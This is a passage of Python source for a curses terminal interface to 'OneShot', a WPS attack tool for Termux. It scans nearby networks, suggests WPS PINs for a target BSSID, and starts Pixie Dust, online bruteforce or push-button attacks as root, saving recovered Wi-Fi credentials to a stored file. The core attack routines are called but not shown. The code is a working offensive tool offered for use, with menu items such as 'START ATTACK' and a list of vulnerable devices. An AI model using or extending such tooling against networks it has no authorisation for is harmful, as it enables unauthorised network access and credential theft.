            self.stdscr.addch(y+i, x+w-1, '|')
        self.stdscr.addch(y, 0, '+')
        self.stdscr.addch(y, self.w-2, '+')
        self.stdscr.addch(y+h-1, 0, '+')
        self.stdscr.addch(y+h-1, self.w-2, '+')
        self.stdscr.hline(y, 1, curses.ACS_HLINE, self.w-3)
        self.stdscr.hline(y+h-1, 1, curses.ACS_HLINE, self.w-3)
        if title:
            self.stdscr.addstr(y, 2, ' ' + title + ' ', curses.color_pair(1) | curses.A_BOLD)

    def refresh(self):
        self.h, self.w = self.stdscr.getmaxyx()
        self.stdscr.erase()
        if self.h < 14 or self.w < 50:
            self.stdscr.addstr(0, 0, "Terminal too small. Min 50x14")
            self.stdscr.refresh()
            return

        # --- Header ---
        title = " OPX OneShot v0.0.2 — by OP AMINUL FF [Termux GUI] "
        self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD | curses.A_REVERSE)
        self.stdscr.addstr(0, max(0, (self.w - len(title)) // 2), title.center(self.w-2))
        self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD | curses.A_REVERSE)

        # --- Main Menu ---
        y = 2
        self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
        self.stdscr.addstr(y, 2, " MAIN MENU ")
        self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)

        menu = [
            "[1] Scan Networks     [2] Set BSSID        [3] Generate PINs",
            "[4] Attack Mode       [5] START ATTACK     [6] STOP",
            "[7] All Options       [8] View Saved       [9] Vuln List",
            "[0] View Full Log     [R] Refresh          [Q] Quit",
        ]
        for i, m in enumerate(menu):
            self.stdscr.addstr(y+1+i, 2, m)

        # --- Status Bar ---
        y_line = y + 5
        mode_n = {'pixie':'Pixie','bruteforce':'Brute','pbc':'PBC'}

        status_parts = [
            ("IFace:", self.iface),
            ("BSSID:", self.bssid or '(not set)'),
            ("PIN:", self.pin or '(auto)'),
            ("Mode:", mode_n.get(self.mode, self.mode)),
        ]
        status = ' | '.join('{} {}'.format(k, v) for k, v in status_parts)
        self.stdscr.attron(curses.A_REVERSE)
        self.stdscr.addstr(y_line, 1, ' ' + status.ljust(self.w-3) + ' ')
        self.stdscr.attroff(curses.A_REVERSE)

        # --- Networks ---
        y_net = y_line + 2
        if self.networks:
            self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
            self.stdscr.addstr(y_net, 2, " NETWORKS ({} found) ".format(len(self.networks)))
            self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)
            self.stdscr.addstr(y_net+1, 2, "{:<3} {:<18} {:<20} {:<8} {:<5} {}".format(
                '#', 'BSSID', 'ESSID', 'Sec', 'PWR', 'Lock'))
            items = list(self.networks.items())
            if self.reverse: items = items[::-1]
            max_show = min(len(items), self.h - y_net - 6)
            for i, (n, net) in enumerate(items[:max_show]):
                essid = (net.get('ESSID') or 'HIDDEN')[:18]
                sec = net.get('Security type', '?')[:6]
                pwr = str(net.get('Level', '?'))
                lock = 'LOCK' if net.get('WPS locked') else ''
                color = curses.color_pair(3) if lock else 0
                self.stdscr.addstr(y_net+2+i, 2,
                    "{:<3} {:<18} {:<20} {:<8} {:<5} {}".format(str(n), net['BSSID'], essid, sec, pwr, lock), color)

        # --- Options summary ---
        y_opt = self.h - 5
        self.stdscr.attron(curses.color_pair(6))
        self.stdscr.addstr(y_opt, 1, ' ' + '\u2500' * (self.w-3) + ' ')
        self.stdscr.attroff(curses.color_pair(6))
        opts = [
            "Dly:{}".format(self.delay),
            "Verb:{}".format('ON' if self.verbose else 'OFF'),
            "Save:{}".format('ON' if self.save_res else 'OFF'),
            "Force:{}".format('ON' if self.pixie_force else 'OFF'),
            "ShowCmd:{}".format('ON' if self.show_cmd else 'OFF'),
            "Loop:{}".format('ON' if self.loop else 'OFF'),
            "Rev:{}".format('ON' if self.reverse else 'OFF'),
            "MTK:{}".format(
        'ON' if self.mtk else 'OFF'),
            "IfaceDown:{}".format('ON' if self.iface_down else 'OFF'),
        ]
        opt_line = ' | '.join(opts)
        self.stdscr.addstr(y_opt+1, 2, opt_line[:self.w-4])

        # --- Log ---
        log_h = self.h - y_opt - 3
        log_y = y_opt + 2
        if log_h > 1:
            with self.log_lock:
                lines = self.log_msgs[-(log_h-1):] if self.log_msgs else []
            for i, msg in enumerate(lines):
                if i >= log_h - 1: break
                msg_s = msg[:self.w-4]
                color = 0
                if msg.startswith('[+]'): color = curses.color_pair(2)
                elif msg.startswith('[-]') or msg.startswith('[!'): color = curses.color_pair(3)
                elif msg.startswith('[*]'): color = curses.color_pair(6)
                elif msg.startswith('[P]'): color = curses.color_pair(5)
                self.stdscr.addstr(log_y+i, 2, msg_s, color)

        # --- Running indicator ---
        if self.running:
            self.stdscr.attron(curses.color_pair(3) | curses.A_BOLD)
            self.stdscr.addstr(0, self.w-12, " [RUNNING] ")
            self.stdscr.attroff(curses.color_pair(3) | curses.A_BOLD)

        self.stdscr.refresh()

    # ==================== INPUT HELPERS ====================

    def _get_input(self, y, x, prompt, maxlen=30, default=''):
        self.stdscr.addstr(y, x, prompt, curses.color_pair(1) | curses.A_BOLD)
        self.stdscr.addstr(y, x+len(prompt), str(default) + ' ' * (maxlen - len(str(default))))
        self.stdscr.move(y, x+len(prompt))
        self.stdscr.refresh()
        curses.echo()
        try:
            s = self.stdscr.getstr(y, x+len(prompt), maxlen).decode('utf-8', errors='replace').strip()
            curses.noecho()
            return s if s else default
        except:
            curses.noecho()
            return default

    def _show_message(self, title, lines, wait=True):
        self.stdscr.erase()
        max_h = min(len(lines)+4, self.h-2)
        y = (self.h - max_h) // 2
        self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
        self.stdscr.addstr(y, (self.w - len(title)) // 2, title)
        self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)
        y += 2
        for i, line in enumerate(lines[:self.h-y-2]):
            self.stdscr.addstr(y+i, 2, str(line)[:self.w-4])
        if wait:
            self.stdscr.addstr(self.h-2, 2, "Press any key to continue...")
            self.stdscr.refresh()
            self.stdscr.getch()

    def _ask_yesno(self, y, x, prompt):
        self.stdscr.addstr(y, x, prompt + " (y/N): ", curses.color_pair(4) | curses.A_BOLD)
        self.stdscr.refresh()
        curses.echo()
        try:
            s = self.stdscr.getstr(y, x+len(prompt)+7, 3).decode('utf-8', errors='replace').strip().lower()
            curses.noecho()
            return s == 'y'
        except:
            curses.noecho()
            return False

    # ==================== ACTIONS ====================

    def _scan_networks(self):
        if not self.iface: self.log("[!] Set Interface first"); return
        self.log("[*] Scanning for WPS networks on {}...".format(self.iface))
        def worker():
            try:
                s = WiFiScanner(self.iface, self.vuln_list)
                nets = s.iw_scanner()
                self._scan_result = nets
                if nets: self.log("[+] Found {} WPS network(s)".format(len(nets)))
                else: self.log("[-] No WPS networks found")
            except Exception as e: self.log("[!] Scan error: {}".format(e))
        threading.Thread(target=worker, daemon=True).start()

    def _show_scan_select(self):
        if self._scan_result:
            self.networks = self._scan_result
            self._scan_result = None
        if not self.networks: self.log("[!] No networks. Scan first."); return

        items = list(self.networks.items())
        if self.reverse: items = items[::-1]

        self.stdscr.erase()
        y = 1
        self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
        self.stdscr.addstr(y, 2, " Select Network ")
        self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD); y += 1
        self.stdscr.addstr(y, 2, "{:<4} {:<18} {:<22} {:<8} {:<5} {:<}".format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'Device')); y += 1
        for n, net in items:
            essid = (net.get('ESSID') or 'HIDDEN')[:20]
            sec = net['Security type'][:6]
            pwr = str(net.get('Level', '?'))
            dev = net.get('Device name', '')[:15]
            self.stdscr.addstr(y, 2, "{:<4} {:<18} {:<22} {:<8} {:<5} {:<}".format(
                str(n)+')', net['BSSID'], essid, sec, pwr, dev)); y += 1
            if y > self.h - 4: break
        self.stdscr.addstr(y+1, 2, "Enter # to select, or ENTER: ")
        self.stdscr.refresh()
        curses.echo()
        try:
            s = self.stdscr.getstr(y+1, 2, 5).decode('utf-8', errors='replace').strip()
            if s and s.isdigit():
                num = int(s)
                if num in self.networks:
                    self.bssid = self.networks[num]['BSSID']
                    essid = self.networks[num].get('ESSID', 'HIDDEN')
                    self.log("[+] Selected: {} ({})".format(self.bssid, essid))
        except: pass
        curses.noecho()

    def _set_bssid(self):
        b = self._get_input(1, 2, "Enter BSSID (MAC): ", 20, self.bssid)
        if b: self.bssid = b.upper(); self.log("[+] BSSID: {}".format(self.bssid))

    def _set_iface(self):
        i = self._get_input(1, 2, "Enter Interface: ", 15, self.iface)
        if i: self.iface = i; self.log("[+] Interface: {}".format(self.iface))

    def _set_pin(self):
        p = self._get_input(1, 2, "Enter WPS PIN (or leave empty for auto): ", 12, self.pin)
        if p: self.pin = p; self.log("[+] PIN: {}".format(self.pin))
        else: self.pin = ''; self.log("[i] PIN: auto")

    def _show_pins(self):
        if not self.bssid: self.log("[!] Set BSSID first"); return
        pins = self.generator.getSuggested(self.bssid)
        if not pins: pins = self.generator.getAll(self.bssid)
        if not pins: self.log("[-] No PINs generated"); return

        self.stdscr.erase()
        y = 1
        self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
        self.stdscr.addstr(y, 2, " PINs for {} ".format(self.bssid))
        self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD); y += 1
        self.stdscr.addstr(y, 2, "{:<4} {:<10} {:<}".format('#', 'PIN', 'Algorithm')); y += 1
        for i, p in enumerate(pins):
            self.stdscr.addstr(y, 2, "{:<4} {:<10} {:<}".format(str(i+1)+')', p['pin'], p['name']))
            y += 1
            if y > self.h - 4: break
        self.stdscr.addstr(y+1, 2, "Enter # to use PIN, or ENTER: ")
        self.stdscr.refresh()
        curses.echo()
        try:
            s = self.stdscr.getstr(y+1, 2, 5).decode('utf-8', errors='replace').strip()
            if s and s.isdigit():
                idx = int(s)-1
                if 0 <= idx < len(pins): self.pin = pins[idx]['pin']; self.log("[+] Selected PIN: {}".format(self.pin))
        except: pass
        curses.noecho()

    def _cycle_mode(self):
        modes = ['pixie', 'bruteforce', 'pbc']
        names = {'pixie':'Pixie Dust Attack (-K)', 'bruteforce':'Online Bruteforce (-B)', 'pbc':'Push Button Connect (--pbc)'}
        try: idx = modes.index(self.mode)
        except: idx = 0
        self.mode = modes[(idx + 1) % len(modes)]
        self.log("[i] Mode: {}".format(names.get(self.mode, self.mode)))

    def _start_attack(self):
        if not self.iface: self.log("[!] Interface required"); return
        if self.mode != 'pbc' and not self.bssid: self.log("[!] BSSID required"); return
        if self.running: self.log("[!] Already running"); return
        if os.geteuid() != 0: self.log("[!] Run as root (sudo)"); return

        if self.mtk:
            try:
                d = Path("/dev/wmtWifi")
                if not d.is_char_device(): self.log("[!] /dev/wmtWifi not found"); return
                d.chmod(0o644); d.write_text("1"); time.sleep(1)
            except Exception as e: self.log("[!] MTK: {}".format(e)); return

        if not iface_up(self.iface):
            self.log('[!] Cannot bring up "{}"'.format(self.iface)); return

        self.running = True
        self.log("[*] === {} attack started ===".format(self.mode))
        self.log("[*] {} | {}".format(self.iface, self.bssid or '(PBC)'))

        def worker():
            try:
                delay = float(self.delay) if self.delay else None
                comp = Companion(self.iface, save=self.save_res, debug=self.verbose, bssid=self.bssid, cb=self.log)
                self.companion = comp
                if self.mode == 'pixie':
                    comp.single(self.bssid, pin=self.pin or None, pxm=True, sc=self.show_cmd, fr=self.pixie_force)
                elif self.mode == 'bruteforce':
                    comp.bf(self.bssid, self.pin or None, delay)
                elif self.mode == 'pbc':
                    comp.single(self.bssid, pbc=True)
            except Exception as e: self.log("[!] Error: {}".format(e))
            finally:
                if self.companion:
                    try: self.companion.cleanup()
                    except: pass
                    self.companion = None
                self.running = False
                if self.mtk:
                    try: Path("/dev/wmtWifi").write_text("0")
                    except: pass
                self.log("[i] Attack finished")

        threading.Thread(target=worker, daemon=True).start()

    def _stop_attack(self):
        if self.companion: self.companion.abort()
        self.log("[!] Aborting...")
        self.running = False

    def _show_options(self):
        running_opt = True
        mode_names = {'pixie': 'Pixie Dust (-K)', 'bruteforce': 'Bruteforce (-B)', 'pbc': 'PBC (--pbc)'}
        while running_opt:
            self.stdscr.erase()
            y = 1
            self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
            self.stdscr.addstr(y, 2, " ALL OPTIONS (CLI -> GUI Mapping) ")
            self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD); y += 2

            # CLI options mapped to GUI
            opts = [
                ("1", "-i --interface", self.iface, "Change interface name"),
                ("2", "-b --bssid", self.bssid or '(not set)', "Set target BSSID"),
                ("3", "-p --pin", self.pin or '(auto)', "Set WPS PIN"),
                ("4", "Mode: -K / -B / --pbc", mode_names.get(self.mode, self.mode), "Cycle attack mode"),
                ("5", "-d --delay", "{}s".format(self.delay), "Delay between attempts"),
                ("6", "-v --verbose", "ON" if self.verbose else "OFF", "Verbose wpa_supplicant output"),
                ("7", "-w --write", "ON" if self.save_res else "OFF", "Save credentials on success"),
                ("8", "-F --pixie-force", "ON" if self.pixie_force else "OFF", "Pixiewps full range brute"),
                ("9", "-X --show-pixie-cmd", "ON" if self.show_cmd else "OFF", "Show pixiewps command"),
                ("a", "--vuln-list", "{} entries".format(len(self.vuln_list)), "Vulnerable devices list"),
                ("b", "--iface-down", "ON" if self.iface_down else "OFF", "Down interface on exit"),
                ("c", "-l --loop", "ON" if self.loop else "OFF", "Loop mode"),
                ("d", "-r --reverse-scan", "ON" if self.reverse else "OFF", "Reverse scan order"),
                ("e", "--mtk-wifi", "ON" if self.mtk else "OFF", "MediaTek WiFi driver"),
            ]

            for num, cli, val, desc in opts:
                arrow = "\u25b6" if val == "ON" else " "
                self.stdscr.addstr(y, 2, "[{}]".format(num), curses.color_pair(1) | curses.A_BOLD)
                self.stdscr.addstr(y, 6, "{:<30}".format(cli))
                self.stdscr.addstr(y, 37, val, curses.color_pair(2) if val == "ON" else curses.color_pair(3) if val == "OFF" else 0)
                self.stdscr.addstr(y, 46, " - {}".format(desc))
                y += 1

            y += 1
            self.stdscr.addstr(y, 2, "[ENTER] Back to main  |  Select option number to toggle/edit", curses.color_pair(4))
            self.stdscr.refresh()

            try:
                k = self.stdscr.getch()
                if k == 10 or k == 27 or k == ord('q'): running_opt = False
                elif k == ord('1'): self._set_iface()
                elif k == ord('2'): self._set_bssid()
                elif k == ord('3'): self._set_pin()
                elif k == ord('4'): self._cycle_mode()
                elif k == ord('5'): self.delay = self._get_input(1, 2, "Delay (seconds): ", 5, self.delay)
                elif k == ord('6'): self.verbose = not self.verbose
                elif k == ord('7'): self.save_res = not self.save_res
                elif k == ord('8'): self.pixie_force = not self.pixie_force
                elif k == ord('9'): self.show_cmd = not self.show_cmd
                elif k == ord('a'): self._load_custom_vuln()
                elif k == ord('b'): self.iface_down = not self.iface_down
                elif k == ord('c'): self.loop = not self.loop
                elif k == ord('d'): self.reverse = not self.reverse
                elif k == ord('e'): self.mtk = not self.mtk
                elif k == ord('V'): self._view_vuln_list()
            except: break
        self.log("[i] Options saved")

    def _load_custom_vuln(self):
        self.stdscr.erase()
        self.stdscr.addstr(2, 2, "Enter path to custom vuln list file: ", curses.color_pair(1) | curses.A_BOLD)
        self.stdscr.refresh()
        curses.echo()
        try:
            fp = self.stdscr.getstr(2, 42, 50).decode('utf-8', errors='replace').strip()
            if fp and os.path.exists(fp):
                with open(fp, encoding='utf-8') as f: self.vuln_list = f.read().splitlines()
                self.log("[+] Loaded {} entries from {}".format(len(self.vuln_list), fp))
            elif fp: self.log("[!] File not found: {}".format(fp))
        except: pass
        curses.noecho()

    def _view_vuln_list(self):
        if not self.vuln_list: self.log("[-] Vuln list is empty"); return
        lines = ["Vulnerable Devices List ({} entries):".format(len(self.vuln_list))]
        for i, v in enumerate(self.vuln_list):
            lines.append("{}) {}".format(i+1, v))
        self._show_message(" Vulnerable Devices List ", lines)

    def _view_saved(self):
        rf = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.txt'
        if os.path.exists(rf):
            with open(rf, encoding='utf-8') as f: data = f.read()
            self._show_message(" Saved Credentials ", data.splitlines())
        else: self.log("[i] No saved credentials found")

    def _view_full_log(self):
        with self.log_lock:
            lines = list(self.log_msgs)
        self._show_message(" Full Log ({} messages) ".format(len(lines)), lines if lines else ["(empty)"])

    def _help_screen(self):
        lines = [
            "Oneshot WPS Tool v0.0.2 - Termux Full GUI",
            "",
            "=== CLI -> GUI Mapping ===",
            "-i --interface          : Options [1] / main screen",
            "-b --bssid              : Options [2] / scan & select",
            "-p --pin                : Options [3] / Generate PINs [3]",
            "-K --pixie-dust         : Attack Mode cycle [4]",
            "-B --bruteforce         : Attack Mode cycle [4]",
            "--pbc                   : Attack Mode cycle [4]",
            "-d --delay              : Options [5]",
            "-w --write              : Options [7]",
            "-F --pixie-force        : Options [8]",
            "-X --show-pixie-cmd     : Options [9]",
            "--vuln-list             : Options [a] load custom file",
            "--iface-down            : Options [b]",
            "-l --loop               : Options [c]",
            "-r --reverse-scan       : Options [d]",
            "--mtk-wifi              : Options [e]",
            "-v --verbose            : Options [6]",
        ]
        self._show_message(" Help / CLI Mapping ", lines)

    # ==================== MAIN LOOP ====================

    def run(self):
        while True:
            self.refresh()
            try: k = self.stdscr.getch()
            except: k = -1

            # Handle scan results
            if self._scan_result is not None: self._show_scan_select()

            if k == -1: time.sleep(0.05); continue

            if k == ord('q') or k == ord('Q'):
                if self.running:
                    if self._ask_yesno(self.h//2, 2, "Attack running. Quit?"): self._stop_attack(); break
                    else: continue
                break

            if k == ord('1'): self._scan_networks()
            elif k == ord('2'): self._set_bssid()
            elif k == ord('3'): self._show_pins()
            elif k == ord('4'): self._cycle_mode()
            elif k == ord('5'): self._start_attack()
            elif k == ord('6'): self._stop_attack()
            elif k == ord('7'): self._show_options()
            elif k == ord('8'): self._view_saved()
            elif k == ord('9'): self._view_vuln_list()
            elif k == ord('0'): self._view_full_log()
            elif k == ord('r') or k == ord('R'): self.refresh()
            elif k == ord('s') or k == ord('S'): self._show_scan_select()
            elif k == ord('h') or k == ord('H'): self._help_screen()

        # Cleanup
        self.stdscr.erase()
        self.stdscr.addstr(0, 0, "Cleaning up...")
        self.stdscr.refresh()
        if self.companion:
            try: self.companion.cleanup()
            except: pass
        if self.mtk:
            try: Path("/dev/wmtWifi").write_text("0")
            except: pass
        if self.iface_down: iface_up(self.iface, down=True)


def main():
    if len(sys.argv) > 1 and sys.argv[1] in ('-u', '--update', 'update'):
        _dir = os.path.dirname(os.path.abspath(__file__))
        print("[*] Updating OneShot in {}...".format(_dir))
        r = subprocess.run(['git', 'pull'], cwd=_dir, capture_output=True, text=True)
        print(r.stdout + r.stderr)
        sys.exit(0 if r.returncode == 0 else 1)

    if sys.hexversion < 0x03060F0: print("Python 3.6+ required"); sys.exit(1)
    try: curses.wrapper(lambda s: OneShotTUI(s).run())
    except KeyboardInterrupt: pass
    print("\nOneShot Termux GUI exited.")


if __name__ == '__main__':
    main()
